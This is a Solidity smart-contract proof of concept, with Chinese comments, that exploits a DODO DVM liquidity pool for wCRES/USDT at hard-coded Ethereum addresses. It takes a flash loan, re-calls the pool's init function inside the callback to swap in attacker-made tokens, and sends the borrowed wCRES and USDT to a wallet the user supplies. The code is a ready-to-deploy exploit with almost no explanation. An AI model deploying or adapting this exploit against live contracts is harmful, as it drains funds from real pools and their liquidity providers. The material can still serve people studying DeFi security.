/**
 *Submitted for verification at Etherscan.io on 2021-01-22
*/

/*

    Copyright 2020 DODO ZOO.
    SPDX-License-Identifier: Apache-2.0

*/

pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

interface DVM{
    
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
    
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;        
    
}


interface Token {
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
}


interface USDT{
    //USDT 并没有完全遵循 ERC20 标准 所以其接口需单独定义
    function transfer(address to, uint value) external;
    function balanceOf(address account) external view returns (uint);
}


contract poc{
    
    
    uint256 wCRES_amount =  130000000000000000000000;
    
    uint256 usdt_amount =  1100000000000;
    
    address wCRES_token = 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a;
    
    address usdt_token = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    
    address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;
    

    // 这里是刚生成的Token1地址
    address token1;
    // 这里是刚生成的Token2地址
    address token2;
    
    uint256 lpFeeRate = 3000000000000000;
    
    address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;
    
    uint256 i = 1;
    
    uint256 k = 1000000000000000000;
    
    bool isOpenTWAP = false;
    

    // 这里填你的测试地址
    address  wallet;
    
    address dvm_wCRES_USDT =  0x051EBD717311350f1684f89335bed4ABd083a2b6;
    
    bytes data = abi.encodeWithSignature("init(address,address,address,uint256,address,uint256,uint256,bool)",maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP);
    
    constructor(address _add1,address _add2,address _wallet) public {
        token1 = _add1;
        token2 = _add2;
        wallet = _wallet;
    }

    function attack() public {
        
        address me = address(this);
        DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT);
        DVM_wCRES_USDT.flashLoan(wCRES_amount,usdt_amount,me," ");
        
    }

    
    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public{
        
        DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT);
        DVM_wCRES_USDT.init(maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP);
        
        Token(wCRES_token).transfer(wallet, Token(wCRES_token).balanceOf(address(this)));
        USDT(usdt_token).transfer(wallet, Token(usdt_token).balanceOf(address(this)));
        
    }

}
